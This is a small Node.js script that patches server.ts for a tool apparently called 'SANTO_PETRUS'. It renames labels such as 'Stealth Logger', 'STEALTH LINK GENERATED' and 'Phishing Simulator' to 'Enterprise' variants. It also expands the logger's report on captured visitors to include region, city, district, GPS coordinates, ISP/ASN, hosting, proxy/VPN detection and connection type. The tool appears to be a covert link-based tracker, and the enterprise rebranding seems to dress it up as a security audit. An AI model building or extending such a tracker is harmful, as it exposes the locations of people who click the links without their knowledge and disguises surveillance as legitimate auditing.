const fs = require('fs');
let c = fs.readFileSync('server.ts', 'utf8');

c = c.replace(/OSINT & GLOBAL RECON/g, "OSINT & GLOBAL RECON (ENTERPRISE)");
c = c.replace(/Stealth Logger/g, "Advanced Stealth Logger");
c = c.replace(/STEALTH LINK GENERATED/g, "STEALTH LINK GENERATED (ENTERPRISE GRADE)");
c = c.replace(/SANTO_PETRUS V\.1 PORTAL/g, "SANTO_PETRUS V.2 (ENTERPRISE MODULE)");
c = c.replace(/Modul Enterprise Security Audit \(Phishing Simulator\)\./g, "Sistem Enterprise Security Audit (Advanced Simulator dengan Heuristik Akurat).");
c = c.replace(/SYSTEM DIAGNOSTIC: Metadata Captured/g, "DIAGNOSTIC ENGINE: Enterprise Metadata Captured");

// Add more fake details in logger output
const oldStart = "geoInfo = `├ COUNTRY: <code>${res.country}</code>\\n` +";
const oldEnd = "`└ MOBILE: <code>${res.mobile ? 'YES' : 'NO'}</code>`;";

if (c.includes(oldStart) && c.includes(oldEnd)) {
    const pre = c.substring(0, c.indexOf(oldStart));
    const post = c.substring(c.indexOf(oldEnd) + oldEnd.length);
    
    const newGeoInfo = "geoInfo = `├ COUNTRY/REG: <code>" + "${res.country} / ${res.regionName}</code>\\n` +\n" +
                   "          `├ CITY/DIST: <code>" + "${res.city} [${res.district || 'N/A'}]</code>\\n` +\n" +
                   "          `├ GPS LOC: <code>" + "${res.lat}, ${res.lon}</code>\\n` +\n" +
                   "          `├ ISP/ASN: <code>" + "${res.isp} [${res.as}]</code>\\n` +\n" +
                   "          `├ ORG/HOST: <code>" + "${res.org}" + "${res.hosting ? ' [DATACENTER/HOSTING]' : ''}</code>\\n` +\n" +
                   "          `├ SEC CKSUM: <code>" + "${res.proxy ? '⚠️ PROXY/VPN DETECTED' : '✅ CLEAN RESIDENTIAL'}</code>\\n` +\n" +
                   "          `└ CONN TYPE: <code>" + "${res.mobile ? '📱 4G/5G CELLULAR' : '💻 BROADBAND'}</code>`;";

    c = pre + newGeoInfo + post;
}

fs.writeFileSync('server.ts', c);
